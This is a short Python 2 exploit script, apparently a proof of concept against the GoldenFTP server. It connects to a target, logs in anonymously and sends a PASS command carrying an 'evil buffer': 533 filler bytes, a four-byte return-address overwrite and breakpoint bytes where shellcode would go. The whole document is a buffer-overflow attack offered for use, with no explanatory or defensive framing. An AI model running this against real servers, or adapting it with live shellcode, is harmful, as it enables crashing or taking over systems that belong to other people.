import socket
import sys
import time
 
Bs = &#039;\x42&#039; * 4
 
buffer = &#039;\x41&#039; * 533 + Bs + &#039;\xcc&#039; * 300
 
if len(sys.argv) != 3:
        print &quot;Usage: ./goldenftp.py &lt;ip&gt; &lt;port&gt;&quot;
        sys.exit()
  
ip   = sys.argv[1]
port = sys.argv[2]
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:   
    print &quot;[*] Sending evil buffer&quot;
    s.connect((ip,int(port)))
    s.recv(1024)
    time.sleep(2)
    s.send(&#039;USER anonymous&#039;+ &#039;\r\n&#039;)
    s.recv(1024)
    time.sleep(3)  
    s.send(&#039;PASS &#039; + buffer + &#039;\r\n&#039;)
    s.recv(1024)   
    time.sleep(1)
    s.close()
except:
    print &quot;Can&#039;t Connect to Server&quot;
    sys.exit()